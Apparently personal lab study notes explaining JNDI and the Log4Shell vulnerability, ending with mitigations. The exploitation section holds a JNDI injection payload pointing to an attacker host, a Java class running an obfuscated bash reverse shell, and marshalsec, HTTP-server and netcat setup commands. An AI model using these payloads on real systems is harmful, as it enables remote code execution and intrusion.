# jndi-remote-execution

Author: Julien Bongars
Date: 2025-09-24 18:56:50
Path: /opt/development/cybersec/hacklas/notes/general/java/jndi-remote-execution.md

---

## JNDI Overview

### What is JNDI?

Java Naming and Directory Interface (JNDI) is a Java API that allows distributed applications to look up services in an abstract, resource-independent way.

### Common Use Cases

- **Database Connection Pooling**: Setting up connection pools on Java EE application servers
- **Service Discovery**: Applications can access resources using JNDI names like `java:comp/env/FooBarPool`
- **Environment Abstraction**: Hide implementation details from applications

### Advantages of JNDI

1. **Environment Independence**: Applications can use the same JNDI name across development, integration, test, and production environments
2. **Security**: Minimizes the number of people who need database credentials - only the application server needs to know
3. **Abstraction**: Applications don't need to know connection details, just the JNDI name

## Log4Shell Vulnerability (CVE-2021-44228)

### Attack Vector

Any user input that gets logged can potentially trigger the vulnerability through Log4j's message lookup feature.

### Vulnerable Code Pattern

```java
// Vulnerable logging patterns
logger.info("User login attempt: " + userInput);
logger.error("Invalid request from: " + clientData);
logger.warn("Processing failed for: " + formData);
```

### Exploitation Process

**1. Payload Injection**

```json
{
  "username": "admin",
  "password": "password",
  "remember": "${jndi:ldap://attacker-server.com:1389/Exploit}"
}
```

**2. Malicious Java Class**

```java
public class Exploit {
    static {
        try {
            // Reverse shell payload
            Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}");
        } catch (Exception e) {
            // Handle silently
        }
    }
}
```

### Attack Chain

1. **Setup malicious LDAP server** to serve exploit class
2. **Host malicious Java class** on HTTP server
3. **Inject JNDI payload** into application input
4. **Log4j processes payload** and connects to attacker's LDAP server
5. **LDAP server responds** with reference to malicious Java class
6. **Target downloads and executes** the malicious class
7. **Reverse shell established** back to attacker

### Tools and Setup

```bash
# Start malicious LDAP server
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker-ip:8000/#Exploit"

# Serve malicious Java class
python3 -m http.server 8000

# Listen for reverse shell
nc -lvnp 4444
```

### Mitigation

- Update Log4j to version 2.17.0+
- Set system property: `log4j2.formatMsgNoLookups=true`
- Input validation and sanitization
- Network segmentation to prevent outbound LDAP connections

## References

- [Censys Blog: CVE-2021-44228 Log4j](https://censys.com/blog/cve-2021-44228-log4j)
- [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html)
